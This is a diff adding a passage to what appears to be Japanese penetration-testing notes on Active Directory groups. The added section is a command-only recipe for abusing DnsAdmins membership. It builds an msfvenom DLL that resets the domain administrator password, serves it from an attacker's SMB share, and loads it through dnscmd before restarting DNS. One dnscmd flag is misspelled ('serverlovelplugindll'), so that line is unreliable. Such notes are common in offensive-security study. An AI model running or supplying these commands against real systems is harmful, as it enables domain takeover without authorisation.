@@ -95,6 +95,18 @@ Server Operators # Windows ServerやActive Directory環境において、サー�
 DnsAdmins # Active Directoryにデフォルトで存在する組み込みグループでDNSサーバーの設定を変更することで任意のDLLを読み込ませるDLLインジェクションが可能。
 ```
 
+## DnsAdminsの悪用によるDLLインジェクション
+```bash
+msfvenom -p windows/x64/exec cmd='net user administrator Password123! /domain' -f dll > dnssetup.dll
+impacket-smbserver share $(pwd) -smb2support
+# Windows
+Get-Service -Name DNS
+dnscmd localhost /config /serverlovelplugindll \\<Kali IP>\share\dnssetup.dll
+reg.exe query "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll
+sc.exe stop dns
+sc.exe start dns
+```
+
 ## ETWとは
 Event Tracing for Windowsの略。OSやアプリケーションの挙動をリアルタイムに監視しているカーネルレベルのシステム。  
 ETWはログに書き込まれる前に検知に加えて、イベントログにない情報も取得可能。  
